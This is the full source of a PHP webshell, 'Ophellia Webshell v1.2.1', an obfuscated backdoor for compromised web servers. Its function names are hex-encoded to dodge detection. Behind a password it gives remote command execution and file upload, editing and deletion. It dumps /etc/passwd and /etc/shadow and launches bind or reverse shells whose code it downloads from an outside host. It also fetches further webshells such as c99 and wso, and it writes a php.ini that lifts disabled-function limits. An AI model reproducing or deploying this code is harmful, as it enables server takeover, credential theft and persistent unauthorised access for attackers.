<?php
/*
           Ophellia Webshell v1.2.1
          copyright @elliottophellia

           illegal use is prohibited
      github.com/elliottophellia/ophellia
*/
$pass='efb0229fee45e63556609731f831e491'; // lovepalestine
$op=array("5f504f5354","5F474554","6572726F725F7265706F7274696E67","7365745F74696D655F6C696D6974","6F625F7374617274","696E695F736574","73657373696F6E5F7374617274","696E695F676574","6D6435","5F53455353494F4E","6368646972","676574637764","66756E6374696F6E5F657869737473","6469736b5f667265655f7370616365","7368656C6C5F65786563","6469726e616d65","7374726970736c6173686573","7374725f7265706c616365","7068705f756e616d65","6765745f63757272656e745f75736572","70687076657273696f6e","66696c655f6765745f636f6e74656e7473","66696C655F7075745F636F6E74656E7473","66696C655F657869737473","676574686f737462796e616d65","6d61696c","69735f7772697461626c65","756e6c696e6b","626173656e616d65","6d6f76655f75706c6f616465645f66696c65","726d646972","7363616E646972","66696c657065726d73","66696c656d74696d65","66696c6573697a65","68746d6c656e746974696573","68746d6c7370656369616c6368617273","66696c656f776e6572","66696c6574797065","6d696d655f636f6e74656e745f74797065","706f7369785f6765747077756964","66696c6567726f7570");function hlx($rr){$xx='';for($c=0;$c<strlen($rr);$c+=2){$xx.=chr(hexdec($rr[$c].$rr[$c+1]));}return(string)$xx;}function xlh($string){$hex='';for($i=0;$i<strlen($string);$i++)$hex.=dechex(ord($string[$i]));return $hex;}$vcx=count($op);for($i=0;$i<$vcx;$i++){$opl[]=hlx($op[$i]);}function sf($f,$t){global $opl;$w=@fopen($f,"w")or@$opl[12]('file_put_contents');if($w){@fwrite($w,$t)or@fputs($w,$t)or@$opl[22]($f,$t);@fclose($w);}}function fsize($file){global $opl;$a=["B","KB","MB","GB","TB","PB"];$pos=0;$size=$opl[34]($file);while($size>=1024){$size/=1024;$pos++;}return round($size,2)." ".$a[$pos];}function lasmod($file){global $opl;return date("d/m/Y H:i:s",$opl[33]($file));}function perms($file){global $opl;if($perms=@$opl[32]($file)){$flag='u';if(($perms&0xC000)==0xC000)$flag='s';elseif(($perms&0xA000)==0xA000)$flag='l';elseif(($perms&0x8000)==0x8000)$flag='-';elseif(($perms&0x6000)==0x6000)$flag='b';elseif(($perms&0x4000)==0x4000)$flag='d';elseif(($perms&0x2000)==0x2000)$flag='c';elseif(($perms&0x1000)==0x1000)$flag='p';$flag.=($perms&00400)?'r':'-';$flag.=($perms&00200)?'w':'-';$flag.=($perms&00100)?'x':'-';$flag.=($perms&00040)?'r':'-';$flag.=($perms&00020)?'w':'-';$flag.=($perms&00010)?'x':'-';$flag.=($perms&00004)?'r':'-';$flag.=($perms&00002)?'w':'-';$flag.=($perms&00001)?'x':'-';return $flag;}else{return substr(sprintf('%o',$opl[32]($file)),-4);}}function goog($item){global $opl;if($opl[12]("posix_getpwuid")){$downer=@$opl[40]($opl[37]($item));$downer=$downer['name'];}else{$downer=$opl[37]($item);}if($opl[12]("posix_getgrgid")){$dgrp=@$opl[40]($opl[41]($item));$dgrp=$dgrp['name'];}else{$dgrp=$opl[41]($item);}return $downer.'/'.$dgrp;}function gtyp($file){global $opl;$gtyp=($opl[12]('mime_content_type'))?$opl[39]($file):$opl[38]($file);return $gtyp;}$opl[2](0);$opl[3](0);$opl[4]();@$opl[5]('max_execution_time',0);@$opl[5]('output_buffering',0);$opl[6]();echo '<html><head><title>Pintu Belakang</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><style>@import url(https://rei.my.id/ophellia/styleee.css);@import url(https://rei.my.id/ophellia/stylee.css);</style><body>';if($opl[8](${$opl[0]}['pass'])==$pass){$opl[6]();${$opl[9]}['pass']=$pass;}if(isset(${$opl[9]}['pass'])==$pass){if($opl[7]('safe_mode')){$Safe="<font color='red'><b>ON</b></font>";}else{$Safe="<font color='green'><b>OFF</b></font>";}if(isset(${$opl[1]}['d'])){$path=hlx(${$opl[1]}['d']);$opl[10](hlx(${$opl[1]}['d']));}else{$path=$opl[11]();}if(isset($mkdir)){$mkdir=$path."/".${$opl[1]}['mkdir'];}if(isset($mkfile)){$mkfile=$path."/".${$opl[1]}['mkfile'];}$f=hlx(${$opl[1]}['f']);$fedit=hlx(${$opl[1]}['fedit']);$gwejh=$opl[16](${$opl[0]}['gwejh']);$mkdir=${$opl[1]}['mkdir'];$tools=${$opl[1]}['t'];$rmdir=hlx(${$opl[1]}['rmdir']);$mkfile=${$opl[1]}['mkfile'];$cndir=${$opl[1]}['cndir'];$file=$_SERVER['PHP_SELF'];$root=$_SERVER['DOCUMENT_ROOT'];$bytes=$opl[13](".");$rfile=hlx(${$opl[1]}['rfile']);$rename=${$opl[1]}['rename'];$path=$opl[17]('\\','/',$path);$si_prefix=array('B','KB','MB','GB','TB','EB','ZB','YB');$class=min((int)log($bytes,1024),count($si_prefix)-1);$size=sprintf('%1.2f',$bytes/pow(1024,$class)).' '.$si_prefix[$class];echo '<img src="//bit.ly/ophelliaa" width="380" /><br/><button><a href="?"><b>HOME</b><a></button> <button><a href="'.$file.'?t='.xlh('upload').'&d='.xlh($path).'"><b>UPLOAD</b></a></button> <button><a href="'.$file.'?t='.xlh('network').'&d='.xlh($path).'"><b>NETWORK</b></a></button> <button><a href="'.$file.'?t='.xlh('mailer').'&d='.xlh($path).'"><b>MAILER</b></a></button> <button><a href="'.$file.'?t='.xlh('info').'&d='.xlh($path).'"><b>INFO</b></a></button> <button><a href="'.$file.'?exit"><b>LOGOUT</b></a></button><br/><form method="post" action=""><input id="ememm" type="text" name="gwejh" value="uname -a"> <input type="submit" value="X"/></form><br/><form method="post" action=""><select id="emem" name="spawn"><option value="webconsole">webconsole</option><option value="indoxploit">indoxploit</option><option value="marijuana">marijuana</option><option value="adminer">adminer</option><option value="phpinfo">phpinfo</option><option value="phpini">php.ini</option><option value="b374k">b374k</option><option value="wso">wso</option><option value="r57">r57</option><option value="c99">c99</option></select>&nbsp;<input type="submit" value="X"/></form> <form method="get" action=""><input id="emem" type="text" name="mkfile" value="CreateFile.php"> <input type="hidden" name="d" value="'.xlh($path).'"> <input type="submit" value="X"/></form><br/><form method="get" action=""><input id="emem" type="text" name="cndir" value='.$path.'>&nbsp;<input type="submit" value="X"/></form> <form method="get" action=""><input id="emem" type="text" name="mkdir" placeholder="CreateDir"> <input type="hidden" name="d" value="'.xlh($path).'"><input type="submit" value="X"/></form>';if(isset($tools)){if(hlx($tools)=='network'){$pty=$opl[21]('https://rei.my.id/back_connect/python.txt');$rby=$opl[21]('https://rei.my.id/back_connect/ruby.txt');$bcc=$opl[21]('https://rei.my.id/back_connect/c.txt');$bcp=$opl[21]('https://rei.my.id/back_connect/perl.txt');$bpc=$opl[21]('https://rei.my.id/bind_shell/c.txt');$bpp=$opl[21]('https://rei.my.id/bind_shell/perl.txt');echo '<h2>Network Tools</h2><h3>Bind Shell</h3><form method="post" action="">IP: <input type="text" name="ip" value="'.$opl[24]($_SERVER['HTTP_HOST']).'" readonly> Port: <input type="text" name="port" value="31337"> Type: <select name="type"><option value="cb">C</option><option value="pb">Perl</option><option value="rbb">Ruby</option><option value="pyb">Python</option></select><input type="submit" value="Execute"/></form><br/><h3>Reverse Shell</h3><form method="post" action="">IP: <input type="text" name="ip" value=""> Port: <input type="text" name="port" value="31337"> Type: <select name="type"><option value="cbc">C</option><option value="pbc">Perl</option><option value="rbbc">Ruby</option><option value="pybc">Python</option></select><input type="submit" value="Execute"/></form>';if(isset(${$opl[0]}['type'])){if(${$opl[0]}['type']=='cb'){sf('/tmp/cb.c',$bpc);$opl[14]('gcc -o /tmp/cb /tmp/cb.c');$opl[14]('/tmp/cb '.${$opl[0]}['port'].' &');echo "<pre>".$opl[14]('ps aux | grep cb')."<pre>";}if(${$opl[0]}['type']=='pb'){sf('/tmp/pb.pl',$bpp);$opl[14]('perl /tmp/pb.pl '.${$opl[0]}['port'].' &');echo "<pre>".$opl[14]('ps aux | grep pb')."<pre>";}if(${$opl[0]}['type']=='cbc'){sf('/tmp/cbc.c',$bcc);$opl[14]('gcc -o /tmp/cbc /tmp/cbc.c');$opl[14]('/tmp/cbc '.${$opl[0]}['ip'].' '.${$opl[0]}['port'].' &');echo "<pre>".$opl[14]('ps aux | grep cbc')."<pre>";}if(${$opl[0]}['type']=='pbc'){sf('/tmp/pbc.pl',$bcp);$opl[14]('perl /tmp/pbc.pl '.${$opl[0]}['ip'].' '.${$opl[0]}['port'].' &');echo "<pre>".$opl[14]('ps aux | grep pbc')."<pre>";}if(${$opl[0]}['type']=='rbb'){sf('/tmp/rbb.rb',$rby);$opl[14]('ruby /tmp/rbb.rb '.${$opl[0]}['port'].' &');echo "<pre>".$opl[14]('ps aux | grep rbb')."<pre>";}if(${$opl[0]}['type']=='rbbc'){sf('/tmp/rbbc.rb',$rby);$opl[14]('ruby /tmp/rbbc.rb '.${$opl[0]}['port'].' '.${$opl[0]}['ip'].' &');echo "<pre>".$opl[14]('ps aux | grep rbbc')."<pre>";}if(${$opl[0]}['type']=='pyb'){sf('/tmp/pyb.py',$pty);$opl[14]('python /tmp/pyb.py '.${$opl[0]}['port'].' &');echo "<pre>".$opl[14]('ps aux | grep pyb')."<pre>";}if(${$opl[0]}['type']=='pybc'){sf('/tmp/pybc.py',$pty);$opl[14]('python /tmp/pybc.py '.${$opl[0]}['port'].' '.${$opl[0]}['ip'].' &');echo "<pre>".$opl[14]('ps aux | grep pybc')."<pre>";}}die();}if(hlx($tools)=='mailer'){echo '<h2>Mailer Tools</h2><form method="post" action="">From: <input type="text" name="from" value="hacker@'.$_SERVER['SERVER_NAME'].'"> To: <input type="text" name="to" value="contact@rei.my.id"> Subject: <input type="text" name="subject" value="im using your webshell!"><br><textarea name="message" style="width: 40%;" rows="15">my ip address is '.$_SERVER['REMOTE_ADDR'].'</textarea><br><input type="submit" value="Execute"/></form><pre>';if(isset(${$opl[0]}['from'])){$headers="From: ".${$opl[0]}['from']."\\\r\\\n";$headers.="Reply-To: ".${$opl[0]}['from']."\\\r\\\n";$headers.="Return-Path: ".${$opl[0]}['from']."\\\r\\\n";$headers.="X-Mailer: PHP/".$opl[20]();$opl[25](${$opl[0]}['to'],${$opl[0]}['subject'],${$opl[0]}['message'],$headers);echo "Mail Sent !";}echo '</pre>';die();}if(hlx($tools)=='upload'){echo"<h2>Upload Tools</h2><form method='post' enctype='multipart/form-data'><div style='justify-content: center'><input type='radio' name='uploadtype' value='1' checked>current_dir [ $path ]<br/><input type='radio' name='uploadtype' value='2'>document_root [ $root ]</div><br/><input type='file' name='upload'> <input type='submit' value='upload' name='upload'></form><br/>";if(isset(${$opl[0]}['upload'])){if(${$opl[0]}['uploadtype']==1){$tmp=$_FILES['upload']['tmp_name'];$up=$opl[28]($_FILES['upload']['name']);if($opl[29]($tmp,$path."/".$up)){echo "<font color='green'><b>SUCCESSFULLY UPLOADED</b></font>";}else{echo "<font color='red'><b>FAILED TO UPLOAD FILE</b></font>";}}else{$tmp=$_FILES['upload']['tmp_name'];$up=$opl[28]($_FILES['upload']['name']);if($opl[29]($tmp,$root."/".$up)){echo "<font color='green'><b>SUCCESSFULLY UPLOADED</b></font>";}else{echo "<font color='red'><b>FAILED TO UPLOAD FILE</b></font>";}}}die();}if(hlx($tools)=='info'){$disable_functions=(!empty(@$opl[7]('disable_functions')))?"<font color='red'><b>".@$opl[7]('disable_functions')."</b></font>":"<font color='green'><b>NONE</b></font>";echo "<div id=\"l\"><pre>System           : ".@$opl[18]('a')." ".$_SERVER['SERVER_SOFTWARE']."<br/>User             : ".$opl[19]()."<br/>Free Space       : $size<br/>Server IP        : ".$opl[24]($_SERVER['HTTP_HOST'])."<br/>Client IP        : ".$_SERVER['REMOTE_ADDR']."<br/>Safe Mode        : $Safe<br/>PHP Version      : ".@$opl[20]()."<br/>Disable Function : $disable_functions";if(($opl[21]('/etc/os-release'))){echo "<br/>/etc/os-release  : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/os-release')."</textarea>";}if(($opl[21]('/etc/passwd'))){echo "<br/>/etc/passwd      : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/passwd')."</textarea>";}if(($opl[21]('/etc/shadow'))){echo "<br/>/etc/shadow      : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/shadow')."</textarea>";}if(($opl[21]('/etc/group'))){echo "<br/>/etc/group       : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/group')."</textarea>";}if(($opl[21]('/etc/hosts'))){echo "<br/>/etc/hosts       : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/hosts')."</textarea>";}if(($opl[21]('/etc/fstab'))){echo "<br/>/etc/fstab       : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/fstab')."</textarea>";}if(($opl[21]('/etc/resolv.conf'))){echo "<br/>/etc/resolv.conf : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/resolv.conf')."</textarea>";}if(($opl[21]('/etc/mtab'))){echo "<br/>/etc/mtab        : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/mtab')."</textarea>";}if(($opl[21]('/etc/ssh/ssh_config'))){echo "<br/>/ssh/ssh_config  : <br/><textarea rows=\"15\" name=\"text\" readonly>".$opl[21]('/etc/ssh/ssh_config')."</textarea>";}echo "</pre></div>";die();}}if(isset($rfile)and $opl[26]($rfile)){if($opl[27]($rfile)){echo("<br/><font color='green'><b>File $rfile Deleted</b></font>");}else{echo("<br/><font color='red'><b>File $rfile Not Deleted</b></font>");}}if(isset($gwejh)){if(!empty($gwejh)){echo "<textarea rows=\"15\" name=\"text\" readonly>";echo $opl[14]($gwejh);echo "</textarea>";}}if(isset($mkdir)){if(!empty($mkdir)){if(mkdir($mkdir,0777,true)){echo"<br/><font color='green'><b>Directory $mkdir Created</b></font>";}else{echo"<br/><font color='red'><b>Directory $mkdir Not Created</b></font>";}}else{echo "<br/><font color='red'><b>Can't create empty name folder</b></font>";}}if(isset($mkfile)){echo '<form method="post" action=""><textarea rows="25" name="ftext"></textarea><br><br/><div id="l"><input type="text" name="fname" value="'.$mkfile.'"\> <input type="submit" value="Save"\> <button type="button" onclick="history.go(-1)">Back</button></div></form><br/>';if(${$opl[0]}['fname']&&${$opl[0]}['ftext']){if($opl[22](${$opl[0]}['fname'],${$opl[0]}['ftext'])){echo "<br/><font color='green'><b>File ".${$opl[0]}['fname']." Created</b></font>";}else{echo "<br/><font color='red'><b>File ".${$opl[0]}['fname']." Not Created</b></font>";}}}if(isset($rmdir)and $opl[26]($rmdir)){if($opl[30]($rmdir)){echo"<br/><font color='green'><b>Directory $rmdir Deleted</b></font>";}else{echo"<br/><font color='red'><b>Directory $rmdir Not Deleted</b></font>";}}if(isset($cndir)){$dir=$cndir;$rr=$_SERVER['SERVER_NAME']."$file?d=".xlh($dir);header("Location: http://$rr");}if(isset(${$opl[0]}['spawn'])){if(${$opl[0]}['spawn']=='webconsole'){sf('webconsole.php',$opl[21]('https://rei.my.id/webshell/webconsole.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='indoxploit'){sf('indoxploit.php',$opl[21]('https://rei.my.id/webshell/indoxploit.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='marijuana'){sf('marijuana.php',$opl[21]('https://rei.my.id/webshell/marijuana.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='adminer'){sf('adminer.php',$opl[21]('https://rei.my.id/webshell/adminer.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='phpinfo'){sf('phpinfo.php',$opl[21]('https://rei.my.id/webshell/phpinfo.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='b374k'){sf('b374k.php',$opl[21]('https://rei.my.id/webshell/b374k.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='wso'){sf('wso.php',$opl[21]('https://rei.my.id/webshell/wso.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='r57'){sf('r57.php',$opl[21]('https://rei.my.id/webshell/r57.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='c99'){sf('c99.php',$opl[21]('https://rei.my.id/webshell/c99.php'));echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}elseif(${$opl[0]}['spawn']=='phpini'){$ini=fopen($root.'/php.ini','w');fwrite($ini,"safe_mode = OFF\\\r\\\ndisable_functions = NONE");fclose($ini);echo "<br/><font color='green'><b>Successfully spawn ".${$opl[0]}['spawn']."<b></font>";}else{echo "<br/><font color='red'><b>Failed to spawn ".${$opl[0]}['spawn']."<b></font>";}}if(isset($rename)){echo '<br/><br/><form method="post" action="">Old Name: <input type="text" name="oldname" value="'.hlx(${$opl[1]}['oldname']).'" readonly> New Name: <input type="text" name="newname" value=""> <input type="submit" value="Execute"/> <button type="button" onclick="history.go(-1)">Back</button></form><pre>';if(${$opl[0]}['oldname']&&${$opl[0]}['newname']){if(isset(${$opl[0]}['oldname'])){$opl[14]('mv '.${$opl[0]}['oldname'].' '.${$opl[0]}['newname']);echo '<font color="green"><b>Rename File Done.</b></font><br />';}else{echo '<font color="red"><b>Rename File Failed.</b></font><br />';}}echo '</pre>';}if(isset($f)and $opl[33]($f)){$text=$opl[35]($opl[21]($f));echo '<textarea rows="25" name="text" readonly>'.$text.'</textarea><br/>';}if(isset($fedit)and $opl[26]($fedit)){$text=$opl[36]($opl[21]($fedit));echo '<form method="post" action=""><textarea rows="25" name="text">'.$text.'</textarea><br><br/><div id="l"><input type="submit" value="Save"\> <button type="button" onclick="history.go(-1)">Back</button></div></form><br/>';if($opl[23]($fedit)){if(isset(${$opl[0]}['text'])){$write=fopen($fedit,'w');$new_text=$opl[16](${$opl[0]}['text']);if(fwrite($write,$new_text)){echo '<font color="green"><b>Edit File Done.</b></font><br />';}else{echo '<font color="red"><b>Edit File Failed.</b></font><br />';}fclose($write);}}}echo '<div class="table-responsive"><table class="table table-hover table-dark"><thead><tr><th style="width:35%"> File Name </th><th style="width:5%"> Edit </th><th style="width:5%"> Remove </th><th style="width:5%"> Rename </th><th style="width:5%"> Filesize </th><th style="width:8%"> Filetype </th><th style="width:5%"> Permission </th><th style="width:8%"> Owner/Group </th><th style="width:8%"> LastModified </th></tr></thead><tbody class="text-nowrap">';foreach($opl[31]($path)as $files){if(!is_dir($files))continue;if($files==".."|$files=="."){echo "<tr><td><a href='?d=".xlh($opl[15]($path))."'>&#9898;$files</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>";}else{echo"<tr><td><a href=$file?d=".xlh($path.'/'.$files).">&#9898;$files</td><td id='c'>-</td><td id='c'><a href=$file?rmdir=".xlh($files)."&d=".xlh($path).">Remove</a></td><td id='c'><a href=?rename&oldname=".xlh($files)."&d=".xlh($path).">Rename</a></td><td id='c'>-</td><td id='c'>".gtyp($files)."</td><td id='c'>".perms($files)."</td><td id='c'>".goog($files)."</td><td id='c'>".lasmod($files)."</td></tr>";}}foreach($opl[31]($path)as $files){if(!is_file($files))continue;echo"<tr><td><a href=$file?f=".xlh($files)."&d=".xlh($path).">&#9898;$files</a></td><td id='c'><a href=$file?fedit=".xlh($files)."&d=".xlh($path).">Edit</a></td><td id='c'><a href=$file?rfile=".xlh($files)."&d=".xlh($path).">Remove</a></td><td id='c'><a href=?rename&oldname=".xlh($files)."&d=".xlh($path).">Rename</a></td><td id='c'>".fsize($files)."</td><td id='c'>".gtyp($files)."</td><td id='c'>".perms($files)."</td><td id='c'>".goog($files)."</td><td id='c'>".lasmod($files)."</td></tr>";}echo "</tbody></table></div>";echo '<div id="r"><a href="https://github.com/elliottophellia"><i>@elliottophellia</i></a></div>';if(isset(${$opl[1]}['exit'])){unset(${$opl[9]}['pass']);echo "<script>window.location.href='?';</script>";exit();}}else{echo '<img src="//bit.ly/ophellia" width="200" /><br/><form action="" method="post"><input type="password" name="pass" style="border: none;"></form>';}header('X-Powered-By: Ophellia v1.2.1');echo '</body></html>';